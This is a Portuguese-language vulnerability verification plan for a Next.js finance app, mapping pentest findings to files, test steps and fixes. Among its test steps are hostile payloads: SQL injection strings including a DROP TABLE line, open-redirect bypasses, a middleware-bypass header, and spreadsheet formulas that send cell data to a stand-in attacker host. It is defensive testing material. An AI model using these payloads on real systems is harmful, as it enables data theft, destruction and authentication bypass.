# Plano de Verificação de Vulnerabilidades — Save Money

Origem: checklist de pentest/scan recebido (7 achados). Este documento traduz cada
item em passos concretos de verificação **neste código específico**, com arquivos,
comandos e critérios de aceite. Nenhum item foi corrigido ainda — este é só o plano
de checagem/reprodução.

Stack relevante: Next.js 16 (App Router) + NextAuth v5 (`session: { strategy: "jwt" }`)
+ Prisma + Postgres. Middleware em `src/proxy.ts`. Server Actions em `**/actions.ts`.
Rotas de API "de verdade" em `src/app/api/**`.

---

## 1. Rate limit ausente (brute force) — 5/5

**Onde procurar:** `src/app/(auth)/actions.ts` (`loginAction`, `registerAction`,
`recoverPasswordAction`), `src/lib/admin-auth.ts` (`verifyAdminCredentials`, login
admin em `src/app/admin/login`). Busca no repo por `rate` / `limit` não retornou
nenhum resultado — indício forte de que **não existe rate limiting em lugar nenhum**
(nem por IP, nem por conta, nem em memória/Redis).

**Como verificar:**
1. Rodar `npm run dev` localmente.
2. Script de brute force contra `loginAction`/endpoint de login (via `curl` simulando
   POST do form ou via um pequeno script que chama a Server Action pela rota HTTP
   que o Next expõe para Server Actions) — disparar 50+ tentativas com senha errada
   para o mesmo e-mail em <10s e confirmar que nenhuma resposta 429/bloqueio aparece.
3. Repetir contra `/admin/login` (`verifyAdminCredentials`).
4. Repetir contra `recoverPasswordAction` (pode ser usado para spam de e-mail /
   enumeração combinada).
5. Confirmar ausência de qualquer middleware, cabeçalho `Retry-After`, ou store de
   tentativas (Redis/Upstash/memória) no código.

**Critério de aceite (vulnerável):** nenhuma tentativa é bloqueada, sem limite por
IP nem por conta.

**Correção esperada (do checklist):** limite por IP + por conta (ex.: Upstash
Ratelimit ou equivalente, aplicado no proxy/middleware ou dentro das actions
sensíveis).

---

## 2. CORS refletindo Origin — 4/5

**Onde procurar:** `next.config.ts` (sem `headers()` configurado hoje),
`src/app/api/**/route.ts` (export, import/parse, import/template, nextauth) e
qualquer `NextResponse` que sete `Access-Control-Allow-Origin`. Grep por
`Access-Control`/`CORS` não encontrou nada no `src` — ou seja, hoje não há CORS
customizado (o comportamento vem do default do Next/NextAuth). Ainda assim, é
preciso confirmar caso a caso.

**Como verificar:**
1. Para cada rota em `src/app/api/*/route.ts`, enviar requisição com
   `Origin: https://evil.example.com` e inspecionar se a resposta reflete esse
   Origin em `Access-Control-Allow-Origin` (com ou sem `Access-Control-Allow-Credentials: true`,
   que é o caso realmente explorável).
2. Testar especialmente `/api/export/transactions` (retorna dados do usuário
   autenticado via cookie de sessão — se CORS refletir Origin + `credentials: true`,
   um site malicioso pode ler a planilha do usuário logado).
3. Testar `/api/auth/[...nextauth]` (rotas do NextAuth) e `/api/import/parse`.
4. Confirmar se o middleware (`src/proxy.ts`) adiciona algum header de CORS (hoje
   não adiciona nenhum).

**Correção esperada:** allowlist explícita de origens confiáveis (produção,
preview, localhost em dev), aplicada via `next.config.ts#headers()` ou por rota,
nunca refletindo `Origin` recebido.

---

## 3. PII / dado demais na resposta (inclusive hash de senha) — 4/5

**Onde procurar:** todo lugar que faz `prisma.user.findUnique/findFirst` sem
`select` explícito, porque por padrão o Prisma retorna **todas** as colunas —
incluindo `passwordHash`. Já encontrado:
   - `src/lib/auth.ts:29` — `authorize()` faz
     `prisma.user.findUnique({ where: { email } })` sem `select` e depois retorna
     `{ id, name, email }` manualmente (ok aqui, mas o objeto `user` completo,
     com `passwordHash`, passa pelos callbacks `jwt`/`session` — verificar se
     algum campo extra vaza pro token/sessão exposta ao client).
   - `src/app/(auth)/actions.ts:31` — `existing = await prisma.user.findUnique({ where: { email } })`
     sem `select`: o objeto completo (com `passwordHash`) fica em memória no
     server; confirmar que não é serializado de volta pro client em nenhum
     `return`.
   - `src/app/(app)/layout.tsx:17` já usa `select` corretamente — comparar com os
     pontos acima como referência de boa prática.

**Como verificar:**
1. Grep por `prisma.user.find` no repo inteiro e listar todos os call sites sem
   `select`.
2. Para cada Server Action / rota que retorna dado de usuário pro client
   (`ActionResult`, JSON de API), inspecionar a resposta de rede no browser
   (DevTools → Network) durante cadastro, login, atualização de perfil,
   `/api/export/transactions`, painel `/admin`.
3. Conferir especificamente se `passwordHash`, `id` interno do banco, ou tokens
   de outros usuários aparecem em qualquer payload JSON retornado ao navegador.
4. Checar `src/lib/admin-data.ts` (painel admin lista usuários) — confirmar que
   os selects ali não incluem `passwordHash`.

**Correção esperada:** usar sempre `select` explícito com só os campos
necessários em toda query que alimenta uma resposta ao client.

---

## 4. JWT na URL / token vivo pós-logout — 4/5

**Onde procurar:** `src/lib/auth.ts` (`session: { strategy: "jwt" }`),
`src/proxy.ts` (usa `req.auth`), fluxo de `signOut` (não usado explicitamente no
código lido até agora — buscar todos os call sites de `signOut`).

**Como verificar:**
1. Confirmar que o NextAuth aqui usa cookie de sessão (`authjs.session-token` /
   `__Secure-authjs.session-token`) e não passa o JWT via querystring em nenhum
   redirect (`callbackUrl`, links de compartilhamento, etc.) — grep por `token=`
   nas URLs geradas pelo app, e inspecionar a URL de callback do Google OAuth em
   `signInWithGoogleAction` (`src/app/(auth)/actions.ts:94`).
2. **Ponto crítico de revogação:** como a estratégia é `jwt` (stateless — sem
   registro na tabela `Session` do Prisma), fazer logout normalmente só apaga o
   cookie do client. Testar: logar, capturar o valor do cookie de sessão, fazer
   logout, e então reenviar manualmente a mesma requisição com o cookie antigo
   (via `curl -H "Cookie: authjs.session-token=..."`) contra uma rota protegida
   (ex.: `/api/export/transactions` ou uma Server Action de `lancamentos`).
   Se a resposta ainda for 200 com dados do usuário, o token continua válido
   até expirar mesmo após logout — confirma a vulnerabilidade.
3. Verificar o admin: `src/lib/admin-auth.ts` usa cookie HMAC próprio com `exp`
   embutido — mesmo teste: capturar cookie, fazer logout do admin (se existir
   rota de logout), reenviar cookie antigo.

**Correção esperada:** token só no header/cookie `httpOnly` (nunca em URL — já
parece ser o caso aqui) **e** invalidação real no logout (ex.: mover para
`strategy: "database"` para poder revogar sessão, ou manter JWT mas checar uma
denylist/versão de sessão no callback `jwt`).

---

## 5. Enumeração de usuário (erro revela se e-mail existe)

**Onde procurar:** `src/app/(auth)/actions.ts`.
   - `registerAction` (linha 32-37): retorna explicitamente
     `fieldErrors: { email: "Este e-mail já está cadastrado" }` — **isso já é
     enumeração por design** no cadastro (comum e geralmente aceito nesse fluxo,
     mas vale documentar).
   - `loginAction` (linha 82-89): já retorna mensagem genérica
     `"E-mail ou senha incorretos"` — parece correto.
   - `recoverPasswordAction` (linha 98-111): já responde sempre com a mesma
     mensagem genérica, independente do e-mail existir — parece correto
     (há inclusive comentário no código confirmando a intenção).

**Como verificar:**
1. Reproduzir os três fluxos manualmente com e-mail existente vs. inexistente e
   comparar: (a) o texto da resposta, (b) o tempo de resposta (timing attack —
   `bcrypt.compare` só roda quando o usuário existe em `loginAction`/`authorize`,
   então tentativas com e-mail inexistente respondem mais rápido; medir com
   `curl -w "%{time_total}"` várias vezes).
2. Confirmar se `registerAction` deveria ser tratado como enumeração aceitável
   (fluxo de cadastro geralmente precisa informar "e-mail já cadastrado") ou se o
   time quer mitigar isso também.
3. Testar `/api/auth/[...nextauth]` — NextAuth por padrão já usa mensagens
   genéricas para credentials erradas; confirmar que nenhum erro customizado
   vaza detalhe.

**Correção esperada:** mensagem genérica em todos os fluxos sensíveis — já
implementado em login/recuperação; decidir conscientemente sobre o cadastro e,
se necessário, igualar tempo de resposta entre os dois casos (dummy hash compare
quando o usuário não existe, como já é feito em `admin-auth.ts:26` para o admin).

---

## 6. Clickjacking (falta header X-Frame-Options)

**Onde procurar:** `next.config.ts` — hoje sem `headers()` (arquivo praticamente
vazio, `const nextConfig: NextConfig = {}`). Confirma ausência de
`X-Frame-Options` / `Content-Security-Policy: frame-ancestors` em toda a app,
inclusive nas páginas de login/cadastro e no formulário de credenciais.

**Como verificar:**
1. Rodar a app e checar os response headers de `/login`, `/dashboard`,
   `/admin/login` via `curl -I` ou DevTools — confirmar ausência de
   `X-Frame-Options` e `Content-Security-Policy`.
2. Montar uma página HTML de teste local com
   `<iframe src="http://localhost:3000/login"></iframe>` e confirmar que carrega
   normalmente (prova de conceito de clickjacking).
3. Atenção especial a `/dividir` (`src/app/dividir/page.tsx`) — página pública
   sem login, mas ainda assim deve ter proteção de framing dependendo do
   conteúdo exposto por `getSplitByToken`.

**Correção esperada (do checklist, "1 min"):** adicionar
`X-Frame-Options: DENY` (ou `SAMEORIGIN` se algum fluxo legítimo precisar de
iframe) via `next.config.ts#headers()`, idealmente junto de
`Content-Security-Policy: frame-ancestors 'none'`.

---

## 7. SQL Injection e IDOR (itens "críticos", cortados na imagem)

A foto corta o texto aqui — tratando como os dois achados mais críticos e
cobrindo ambos preventivamente:

### 7a. SQL Injection
**Onde procurar:** grep por `$queryRaw` / `$executeRaw` no repo. Resultado atual:
usados em `src/lib/admin-data.ts`, `src/lib/budget-data.ts`,
`src/lib/dashboard-data.ts`. Como o projeto usa Prisma para o resto, o risco só
existe se alguma dessas raw queries concatenar string em vez de usar
`Prisma.sql`/tagged template com parâmetros.

**Como verificar:**
1. Abrir os três arquivos e listar cada `$queryRaw`/`$executeRaw`: confirmar se
   usam template tag (`` prisma.$queryRaw`...` `` — seguro, parametrizado) ou
   `$queryRawUnsafe`/concatenação de string (perigoso).
2. Para qualquer uso que receba filtro vindo do usuário (datas, texto de busca,
   IDs de categoria/tag em `lancamentos`, filtros do dashboard/admin), testar
   payloads como `' OR '1'='1`, `'; DROP TABLE "User"; --` nos parâmetros de
   URL/formulário que alimentam essas queries.
3. Conferir também `src/lib/transaction-filters.ts` e
   `src/lib/validations/transaction-filters.ts` (usados por
   `/api/export/transactions`), já que filtros de transação costumam ser o
   ponto de entrada de dado não confiável mais provável.

### 7b. IDOR (Insecure Direct Object Reference)
**Onde procurar:** todo endpoint/action que recebe um `id` (categoria, meta,
desejo, cartão, lançamento, grupo, transação) e precisa confirmar
`where: { id, userId }` (escopado ao dono) em vez de só `where: { id }`.

Pontos já observados como corretos (referência de boa prática):
   - `grupos/actions.ts` — `updateCategoryAction`/`deleteCategoryAction` fazem
     `findFirst({ where: { id, userId } })` antes de agir. Bom padrão.
   - Porém `batchUpdateCategoriesAction` (linha 148) faz o `update` final com
     `where: { id: u.id }` **sem repetir `userId`** — a checagem de posse
     acontece só no passo anterior (`findMany` filtrando por `userId` para
     montar `validIds`), então na prática está coberto, mas vale confirmar que
     não há brecha de corrida (TOCTOU) entre o `findMany` e o `$transaction`.

**Como verificar (repetir para cada domínio: `lancamentos`, `metas`, `desejos`,
`cartoes`, `grupos`):**
1. Ler cada `actions.ts` do domínio (`src/app/(app)/*/actions.ts`) e listar
   toda função que recebe `id` como parâmetro.
2. Para cada uma, confirmar se a query de leitura/escrita inclui `userId` da
   sessão atual no `where` (ou um `findFirst` de posse antes do `update`/`delete`
   por `id` puro).
3. Teste manual (autenticado como Usuário A): pegar um `id` de lançamento/meta/
   desejo/cartão pertencente ao Usuário B (criar 2 contas de teste) e tentar
   editar/excluir/visualizar via a Server Action correspondente, chamando-a
   diretamente (não só pela UI) com o `id` do Usuário B. Esperado: erro
   "não encontrado", nunca sucesso nem dado de B.
4. Caso especial `dividir/[token]` (`src/lib/split-data.ts` /
   `getSplitByToken`): confirmar que o token é longo/aleatório o suficiente
   (não sequencial/adivinhável) e que a página pública só expõe exatamente os
   dados da divisão, não dados adicionais do usuário dono.
5. Rota `/api/export/transactions`: já usa `session.user.id` corretamente para
   escopar (linha 19 e `buildTransactionWhere(userId, filters)`) — usar como
   referência do padrão certo ao revisar os demais domínios.

**Correção esperada:** todo `findFirst`/`update`/`delete` por `id` de recurso
pertencente a um usuário deve sempre incluir `userId` da sessão no `where` (ou
uma checagem de posse imediatamente antes, sem gap de tempo/transação entre a
checagem e a ação).

---

# Parte 2 — Técnicas de exploração mais recentes (2024–2025)

Complemento ao checklist original, cobrindo classes de ataque mais atuais e
específicas do stack usado aqui (Next.js 16 App Router + Server Actions +
NextAuth v5 + SheetJS/xlsx). Alguns itens abaixo já são **achados confirmados**
por leitura de código (marcados como tal); outros são **pontos a testar**.

## 8. Open Redirect via `callbackUrl` (achado confirmado)

**Onde:** `src/app/(auth)/login/page.tsx:30`

```ts
router.push(searchParams.get("callbackUrl") ?? "/dashboard");
```

O valor de `callbackUrl` vem direto da query string e é usado sem validar que é
um path relativo interno (`/algo`). `src/proxy.ts:35` só *gera* esse parâmetro
com `nextUrl.pathname` (seguro), mas nada impede um atacante de montar o próprio
link, ex.: `https://savemoney.app/login?callbackUrl=https://evil.example.com/phish`
ou variantes de bypass conhecidas (`//evil.example.com`, `/\evil.example.com`,
`https:/evil.example.com`) e enviar por phishing/e-mail. Depois de um login
legítimo, o usuário é redirecionado para fora do domínio — cadeia clássica
"open redirect pós-login" usada para phishing com credibilidade (o clique
inicial é para um domínio confiável).

**Como verificar:**
1. Acessar `/login?callbackUrl=https://example.org` (ou `//example.org`,
   `/%2F%2Fexample.org`), logar de verdade e observar se `router.push` tenta
   navegar para fora do site (checar Network/Console por erro de navegação
   cross-origin — mesmo se falhar silenciosamente hoje, é uma dependência
   frágil de comportamento do browser, não uma proteção do app).
2. Testar as variantes de bypass de "startsWith('/')" (`//`, `/\`, `\/\/`,
   URL com `@` embutido) contra qualquer validação que venha a ser adicionada.
3. Confirmar que o mesmo padrão não existe em outros lugares que leem
   `callbackUrl`/`redirectTo` de querystring (grep por `searchParams.get(`).

**Correção esperada:** validar que `callbackUrl` começa com `/` e não com `//`
(path relativo genuíno) antes de usar em `router.push`, ou usar uma allowlist de
rotas internas — nunca confiar em query param para destino de redirect
pós-autenticação.

---

## 9. Formula/CSV Injection na exportação XLSX (achado confirmado)

**Onde:** `src/app/api/export/transactions/route.ts:36-49`

O campo `transaction.description` (texto livre, definido pelo próprio usuário
ao criar o lançamento — `src/app/(app)/lancamentos/actions.ts`) é escrito
diretamente em uma célula da planilha via `XLSX.utils.aoa_to_sheet`, sem
nenhum escaping. Se a descrição começar com `=`, `+`, `-`, `@`, ou `\t`/`\r`,
o Excel/LibreOffice/Google Sheets interpretam como **fórmula** ao abrir o
arquivo exportado — técnica conhecida como CSV/Formula Injection, amplamente
explorada em 2023-2025 contra features de "exportar para Excel/CSV" (pode
levar a execução de comando via `=cmd|'/c calc'!A1` em versões antigas do
Excel, exfiltração de dados via `=HYPERLINK`/`=WEBSERVICE`, ou DDE).

**Como verificar:**
1. Criar um lançamento com descrição `=HYPERLINK("http://attacker.example/steal?d="&A2,"clique")`
   (ou `=1+1`, mais simples, só para confirmar que vira fórmula).
2. Exportar via `/api/export/transactions` e abrir o `.xlsx` gerado no
   Excel/LibreOffice — confirmar se a célula é avaliada como fórmula em vez de
   texto literal.
3. Repetir com `category.name`/`subcategory.name`/`tag.name` (também vêm de
   input do usuário, mesma exposição).
4. Verificar se `src/lib/import-helpers.ts` (rota de import) tem o problema
   inverso — planilha maliciosa importada e depois reexportada, propagando a
   fórmula para outro usuário (ex.: em contas compartilhadas/grupos).

**Correção esperada:** prefixar valores que comecem com `= + - @ \t \r` com um
apóstrofo (`'`) antes de escrever na célula, ou usar a opção de "texto puro"
do SheetJS para essas colunas.

---

## 10. Next.js Middleware Authorization Bypass (CVE-2025-29927) — item a checar

**Onde:** `src/proxy.ts` — todo o controle de acesso das rotas do app (exceto
`/admin`, que tem checagem própria) depende do middleware do Next.js.

Em março/2025 foi divulgada uma vulnerabilidade crítica (CVE-2025-29927) em que
enviar o header interno `x-middleware-subrequest` faz o Next.js **pular a
execução do middleware inteiro**, permitindo acessar rotas "protegidas" sem
passar pela checagem de sessão. Afetava todas as versões antes de 12.3.5,
13.5.9, 14.2.25 e 15.2.3 (corrigido depois em toda a série 15.x/16.x).

**Como verificar:**
1. Confirmar a versão exata instalada: `next@16.2.7` (já visto em
   `package.json`) — está numa faixa muito posterior à correção, mas validar
   rodando `npm ls next` e conferindo o changelog/advisory
   (`GHSA-f82v-jwr5-mffw`) para essa versão específica antes de descartar.
2. Mesmo com a versão corrigida, testar manualmente: sem estar logado, enviar
   `curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware"`
   contra uma rota protegida (`/dashboard`, `/lancamentos`) e confirmar que
   ainda retorna redirect para `/login` (não deve vazar conteúdo).
3. **Boa notícia como defesa em profundidade:** `src/app/(app)/layout.tsx:7-12`
   já chama `auth()` de novo e faz `redirect("/login")` se não houver sessão —
   ou seja, mesmo num bypass total do middleware, as páginas dentro de `(app)`
   têm uma segunda barreira. Confirmar que **toda** rota sensível está de fato
   dentro do grupo `(app)` (nenhuma página protegida fora dele, sem o layout).
4. `/admin` tem o mesmo padrão duplicado (`src/proxy.ts` + verificação própria
   em `src/app/admin/(dashboard)/layout.tsx:8-11`) — bom, mas confirmar se
   `src/app/admin/actions.ts` (Server Actions do admin) também revalida a
   sessão admin em cada action, e não confia só no layout ter sido renderizado
   (Server Actions podem ser chamadas diretamente via POST, sem passar pelo
   layout — ver item 13).

**Correção esperada:** manter Next.js sempre atualizado nessa família de CVEs
e nunca depender só do middleware — toda página/Server Action sensível deve
revalidar sessão no server, como já é o padrão em `(app)/layout.tsx`.

---

## 11. Cabeçalhos de segurança incompletos (expansão do item 6)

**Onde:** `next.config.ts` (vazio hoje).

Além de `X-Frame-Options` (item 6 original), faltam outros headers hoje
padrão em qualquer app moderno:
   - `Content-Security-Policy` (mitiga XSS residual e reforça anti-clickjacking
     via `frame-ancestors`)
   - `Strict-Transport-Security` (força HTTPS, evita downgrade attack)
   - `X-Content-Type-Options: nosniff` (evita MIME sniffing — relevante para o
     endpoint de export/import que aceita/gera arquivos)
   - `Referrer-Policy: strict-origin-when-cross-origin` (evita vazar URLs
     internas com token/id em query string via header `Referer`)
   - `Permissions-Policy` (desliga APIs de browser não usadas: câmera,
     microfone, geolocalização)

**Como verificar:** `curl -I` em `/`, `/login`, `/dashboard`, `/dividir`,
`/api/export/transactions` e comparar contra
[securityheaders.com](https://securityheaders.com) ou `npx @rehearsal/http-header-check`
localmente (ou só inspeção manual mesmo).

**Correção esperada:** um bloco único de `headers()` em `next.config.ts`
aplicando o conjunto acima a todas as rotas.

---

## 12. Server Actions como superfície HTTP direta (item a checar)

Todo `"use server"` em `**/actions.ts` vira um endpoint POST real no Next.js
(com um ID de action codificado), **independente de estar sendo chamado pela
UI ou não**. Isso é uma classe de ataque específica de App Router explorada
desde 2023/2024: qualquer função exportada de um arquivo `"use server"` pode
ser invocada diretamente com o `curl`/Postman certo, pulando toda validação de
UI (disabled buttons, campos escondidos, ordem de passos no wizard).

**Como verificar:**
1. Listar todas as funções exportadas de cada `actions.ts`
   (`src/app/(app)/*/actions.ts`, `src/app/(auth)/actions.ts`,
   `src/app/admin/actions.ts`) e confirmar que **cada uma** — não só as
   chamadas pela UI atual — faz sua própria checagem de auth
   (`requireUserId()`/`auth()`) logo no início. Já visto como padrão correto em
   `grupos/actions.ts:17-23` (`requireUserId()`); replicar a auditoria para os
   outros domínios (`lancamentos`, `metas`, `desejos`, `cartoes`,
   `import-actions.ts`).
2. Confirmar se alguma action assume que "só é chamada depois de tal outra"
   (dependência de ordem/estado do wizard de importação, por exemplo) e testar
   chamar as actions fora de ordem / repetidamente / com dados que a etapa
   anterior deveria ter validado.
3. Checar se o Next.js 16 aqui já teria a proteção nativa de verificação de
   `Origin` para Server Actions (mitiga CSRF cross-site na maioria dos casos)
   — confirmar rodando uma requisição POST forjada de um `Origin` diferente
   contra uma action de escrita (ex.: `deleteCategoryAction`) e esperando
   rejeição.

**Correção esperada:** toda Server Action que muda dado tem que revalidar
sessão + posse do recurso internamente (nunca confiar que só é alcançável pela
UI protegida).

---

## 13. Race condition / TOCTOU em ações financeiras (item a checar)

Além do ponto já levantado em `batchUpdateCategoriesAction` (item 7b), o
padrão geral do projeto é "buscar posse (`findFirst`) → agir (`update`/`delete`)"
em requisições separadas — comum em Server Actions, mas sujeito a corrida se o
mesmo recurso for alvo de duas requisições simultâneas (double-submit de
formulário, duplo clique, ou replay intencional).

**Como verificar:**
1. Em `lancamentos/actions.ts`, identificar as actions de criação de
   lançamento parcelado/recorrente e disparar 2 requisições idênticas em
   paralelo (`Promise.all` de dois `fetch` para a mesma action) — checar se
   cria lançamento duplicado ou corrompe o parcelamento.
2. Testar o mesmo em ações de meta/desejo que envolvem soma de valores
   (ex.: contribuição para uma meta) — corrida pode causar valor
   contabilizado errado (lost update).
3. Confirmar se alguma dessas operações deveria estar dentro de
   `prisma.$transaction` com isolamento adequado e hoje não está.

**Correção esperada:** operações sensíveis a duplicidade devem usar
transação com constraint única no banco (ex.: idempotency key) ou
`SELECT ... FOR UPDATE` via `$transaction`, não só checagem otimista antes do
`update`.

---

## 14. Cadeia de suprimentos / dependências (achado confirmado — `npm audit`)

`npm audit` (rodado neste checkpoint) reportou 10 vulnerabilidades conhecidas
em dependências transitivas: `hono` (alta severidade — bypass de path/CORS
wildcard-com-credenciais, entra via tooling do Prisma), `postcss` (XSS em CSS
stringify, via `next`), `uuid` (bounds check ausente, via `exceljs`, não usado
em runtime aqui). A maioria parece vir de devDependencies/tooling e não do
bundle de produção, mas precisa confirmação — não assumir "moderate" como
"irrelevante" sem checar se o pacote roda em runtime ou só em build/dev.

Ponto adicional específico deste projeto: `xlsx` (SheetJS) está fixado via
tarball direto do CDN deles (`"xlsx": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"`)
em vez do registro npm — decisão da própria SheetJS por causa de CVEs antigas
não corrigidas no pacote publicado no npm (prototype pollution / ReDoS). Isso
é a mitigação correta, mas **instalar via URL de tarball externo, sem hash de
integridade fixado no lockfile apontando pra esse host, é em si um vetor de
supply chain** (se o CDN for comprometido ou o link mudar de conteúdo, o
`npm install` traria código diferente sem aviso).

**Como verificar:**
1. Rodar `npm audit` e `npm ls next hono postcss uuid exceljs` para separar
   runtime de dev/tooling.
2. Conferir se `package-lock.json` fixa um `integrity` (hash) para o tarball
   do `xlsx` — se sim, qualquer alteração no CDN quebra o install (bom sinal);
   se não, é um ponto cego.
3. Automatizar isso: adicionar `npm audit --audit-level=high` (ou
   `pnpm audit`/Dependabot/Snyk) no CI, hoje aparentemente ausente.

**Correção esperada:** pipeline de CI falhando em vulnerabilidade `high`+ nova,
e confirmação de que o lockfile pina integridade do tarball externo do xlsx.

---

## Resumo — achados confirmados vs. pontos a testar (Parte 2)

| # | Item | Status |
|---|------|--------|
| 8 | Open redirect via `callbackUrl` no login | **Confirmado por leitura de código** |
| 9 | Formula/CSV injection na exportação XLSX | **Confirmado por leitura de código** |
| 10 | CVE-2025-29927 (bypass de middleware) | A testar (mitigado por defesa em profundidade no layout, mas validar) |
| 11 | Headers de segurança incompletos (CSP/HSTS/etc.) | **Confirmado — ausentes** |
| 12 | Server Actions como endpoint direto sem auth redundante | A auditar por domínio |
| 13 | Race condition/TOCTOU em ações financeiras | A testar |
| 14 | Dependências vulneráveis + supply chain do `xlsx` via CDN | **Confirmado por `npm audit`** |

---

## Como executar este plano

1. Rodar cada seção isoladamente, documentando resultado (reproduziu / não
   reproduziu) e evidência (request/response, screenshot, log).
2. Priorizar 7 (SQLi/IDOR) e 1 (rate limit) primeiro — maior impacto — seguidos
   dos achados já confirmados por leitura de código na Parte 2 (8, 9, 11, 14),
   que são rápidos de corrigir e não dependem de reprodução extensa.
3. Depois de cada verificação, abrir uma tarefa de correção separada por item
   (não misturar fix de vários achados no mesmo commit/PR).
4. Repetir os testes de IDOR para **todo** domínio com recursos por usuário
   (lançamentos, metas, desejos, cartões, grupos/categorias, split/dividir) —
   não basta testar um e assumir os outros.
5. Repetir a auditoria do item 12 (Server Actions sem auth redundante) para
   **todo** arquivo `actions.ts`, não só o exemplo usado (`grupos`).
